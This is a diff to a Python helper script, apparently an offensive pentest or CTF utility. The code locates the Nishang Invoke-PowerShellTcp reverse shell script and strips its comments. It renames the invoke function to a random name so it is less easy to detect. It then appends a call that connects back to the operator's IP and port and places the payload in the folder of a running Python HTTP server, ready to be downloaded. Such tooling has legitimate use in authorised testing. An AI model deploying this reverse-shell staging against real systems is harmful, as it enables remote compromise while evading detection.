@@ -6,8 +6,6 @@ import string
 import random
 import base64
 
-NISHANG_SCRIPT = '/usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1'
-
 def get_ip(iface):
     cmd = f"ip a s {iface} | grep -Eo \'[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\\.[0-9]{{1,3}}\' | head -n 1"
     return os.popen(cmd).read().strip('\n')
@@ -110,29 +108,6 @@ def select_python_http():
         index = TerminalMenu(options).show()
         return pids[index], ports[index]
 
-def copy_nishang(ip, port, directory):
-    lines = open(NISHANG_SCRIPT, 'r').readlines()
-    randomName = random_name(8)
-    functionName = 'Invoke-' + randomName
-    filename = f"{randomName}.ps1"
-    output = ''
-    comment = False
-    for l in lines:
-        if l.startswith('<#'): # strip comments
-            comment = True
-        if l.startswith('function '):
-            output += f"function {functionName}\n" # rename the invoke function so it's not as easy to detect
-        elif not comment:
-            output += l
-        if l.startswith('#>'):
-            comment = False
-    output += '\n' + f"{functionName} -Reverse -IPAddress {ip} -Port {port}"
-
-    f = open(directory + filename, 'w')
-    f.write(output)
-    f.close
-    return filename
-
 def is_python_http_running():
     cmd = "ps -ef | grep http.server | grep -v grep"
     output = os.popen(cmd).read()
@@ -164,14 +139,45 @@ def choose_apache_or_python():
     index = TerminalMenu(["Apache, port 80", "Python HTTP"]).show()
     return index == 0
 
+def copy_nishang(ip, port, directory, nishang_script):
+    lines = open(nishang_script, 'r').readlines()
+    randomName = random_name(8)
+    functionName = 'Invoke-' + randomName
+    filename = f"{randomName}.ps1"
+    output = ''
+    comment = False
+    for l in lines:
+        if l.startswith('<#'): # strip comments
+            comment = True
+        if l.startswith('function '):
+            output += f"function {functionName}\n" # rename the invoke function so it's not as easy to detect
+        elif not comment:
+            output += l
+        if l.startswith('#>'):
+            comment = False
+    output += '\n' + f"{functionName} -Reverse -IPAddress {ip} -Port {port}"
+
+    f = open(directory + filename, 'w')
+    f.write(output)
+    f.close
+    return filename
+
 def nishang_shell_menu():
     if is_python_http_running():
+        locate_script_cmd = 'locate nishang | grep Invoke-PowerShellTcp.ps1'
+        nishang_scripts = strip_lines(os.popen(locate_script_cmd).readlines())
+        if len(nishang_scripts) == 0:
+            print("You need the nishang scripts.")
+            print("sudo apt install nishang")
+            print("sudo updatedb")
+            input("Press any key to continue")
+        nishang_script = nishang_scripts[0] 
         rev_shell_port = input("Enter port for nishang reverse shell to connect: ")
         pid, port = select_python_http()
         print(f"Server {pid} on port {port}")
         directory = f"/proc/{pid}/cwd/"
         ip = get_interface_ip()
-        filename = copy_nishang(ip, rev_shell_port, directory)
+        filename = copy_nishang(ip, rev_shell_port, directory, nishang_script)
         url = f"http://{ip}:{port}/{filename}"
         if int(port) == 80: url = f'http://{ip}/{filename}'
         print(f"Nishang URL: {url}")
